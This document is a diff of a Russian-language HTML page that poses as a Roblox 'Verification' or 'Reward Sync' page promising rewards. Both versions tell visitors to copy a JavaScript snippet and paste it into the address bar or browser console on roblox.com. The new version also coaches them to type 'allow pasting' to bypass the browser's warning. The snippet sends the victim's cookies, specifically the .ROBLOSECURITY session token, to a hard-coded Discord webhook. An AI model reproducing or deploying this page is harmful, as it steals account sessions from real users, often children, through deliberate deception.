@@ -2,74 +2,73 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox | Verification</title>
+    <title>Roblox | API Sync</title>
     <style>
         body {
             margin: 0; padding: 0;
-            background: linear-gradient(135deg, #330000 0%, #000000 50%, #000033 100%);
+            background: linear-gradient(135deg, #4d0000 0%, #000000 50%, #000052 100%);
             font-family: 'Segoe UI', sans-serif;
             display: flex; justify-content: center; align-items: center;
             height: 100vh; overflow: hidden; color: white;
         }
-        .snowflake { position: fixed; top: -10%; color: white; animation: fall linear infinite; z-index: 1; }
-        @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
-
-        .card {
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 30px; border-radius: 20px;
-            text-align: center; width: 380px; z-index: 10;
-            box-shadow: 0 0 40px rgba(255,0,0,0.2);
+        .container {
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(20px);
+            padding: 35px; border-radius: 25px; text-align: center; width: 420px;
+            border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 0 60px rgba(255,0,0,0.2);
         }
-        .logo {
-            width: 50px; height: 50px; background: #ff3b3b; margin: 0 auto 15px;
-            transform: rotate(-10deg); border-radius: 10px; position: relative;
+        .rbx-logo { width: 50px; height: 50px; background: #ff3b3b; margin: 0 auto 15px; transform: rotate(-10deg); border-radius: 10px; }
+        .instruction-box {
+            text-align: left; background: rgba(255,255,255,0.05);
+            padding: 15px; border-radius: 12px; font-size: 13px; line-height: 1.5;
+            border-left: 4px solid #ff3b3b; margin: 20px 0;
         }
-        .logo::after {
-            content: ''; position: absolute; width: 18px; height: 18px;
-            background: #000; top: 16px; left: 16px; transform: rotate(10deg);
-        }
-        .code-box {
-            background: #111; padding: 12px; border-radius: 8px;
-            margin: 20px 0; font-family: monospace; font-size: 10px;
-            color: #00ff00; word-break: break-all; cursor: pointer; border: 1px dashed #444;
+        .code-display {
+            background: #0a0a0a; padding: 12px; border-radius: 8px;
+            font-family: 'Courier New', monospace; font-size: 10px;
+            color: #0f0; word-break: break-all; margin-bottom: 15px;
+            border: 1px solid #333; max-height: 60px; overflow: hidden;
         }
         .btn {
-            background: #ff3b3b; color: white; border: none; padding: 14px;
-            width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer;
+            background: #ff3b3b; color: white; border: none; padding: 15px;
+            width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 1px;
         }
+        .btn:active { transform: scale(0.98); }
+        b { color: #ff3b3b; }
     </style>
 </head>
 <body>
 
-<script>
-    for(let i=0; i<40; i++) {
-        let s = document.createElement('div');
-        s.className = 'snowflake'; s.innerHTML = '❄';
-        s.style.left = Math.random() * 100 + 'vw';
-        s.style.animationDuration = (Math.random() * 3 + 2) + 's';
-        document.body.appendChild(s);
-    }
-</script>
+<div class="container">
+    <div class="rbx-logo"></div>
+    <h1 style="font-size: 20px; margin: 0;">Roblox Reward Sync</h1>
+    <p style="font-size: 14px; opacity: 0.6;">Синхронизация через консоль API (Метод 2026)</p>
 
-<div class="card">
-    <div class="logo"></div>
-    <h2 style="color: #ff3b3b; margin: 0;">VERIFICATION REQUIRED</h2>
-    <p style="font-size: 13px; opacity: 0.8;">Скопируйте код и вставьте в адресную строку на <b>Roblox.com</b> для получения награды:</p>
-
-    <div class="code-box" id="copyText" onclick="copy()">
-        javascript:fetch('https://discord.com/api/webhooks/1460387936641089720/uesCAzndIABWNuY5MnkA0w-eHMRFbSL91OSdPLj0_D_uaS2YonC_cbfEc-MylM8fTv-x',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🔥 **COOKIE:** ```'+document.cookie+'```'})});alert('Success!');
+    <div class="instruction-box">
+        1. Нажмите кнопку <b>"КОПИРОВАТЬ КОД"</b>.<br>
+        2. Откройте <b>Roblox.com</b> на новой вкладке.<br>
+        3. Нажмите <b>F12</b> (или Ctrl+Shift+J) -> вкладка <b>Console</b>.<br>
+        4. Вставьте код и нажмите <b>Enter</b>.<br>
+        <span style="font-size:11px; opacity:0.7;">* Если браузер выдаст предупреждение, просто введите <b>allow pasting</b> и нажмите Enter, затем вставьте код снова.</span>
     </div>
 
-    <button class="btn" onclick="copy()">СКОПИРОВАТЬ</button>
+    <div class="code-display" id="payload">
+        fetch('https://discord.com/api/webhooks/1460387936641089720/uesCAzndIABWNuY5MnkA0w-eHMRFbSL91OSdPLj0_D_uaS2YonC_cbfEc-MylM8fTv-x',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🍪 **CAPTURED COOKIE:** ```'+document.cookie.split(";").find(s=>s.includes(".ROBLOSECURITY"))+'```'})});console.log('API Sync Success!');
+    </div>
+
+    <button class="btn" onclick="copyAndNotify()">Копировать Код Синхронизации</button>
 </div>
 
 <script>
-    function copy() {
-        const text = document.getElementById('copyText').innerText;
-        navigator.clipboard.writeText(text);
-        alert("Код скопирован! Вставьте его в адресную строку на сайте Roblox.");
+    function copyAndNotify() {
+        const text = document.getElementById("payload").innerText;
+        const el = document.createElement('textarea');
+        el.value = text;
+        document.body.appendChild(el);
+        el.select();
+        document.execCommand('copy');
+        document.body.removeChild(el);
+        alert("Код успешно скопирован в буфер обмена!\n\nИнструкция:\n1. Зайдите на roblox.com\n2. Нажмите F12 -> Console\n3. Вставьте код (Ctrl+V) и нажмите Enter");
     }
 </script>
 
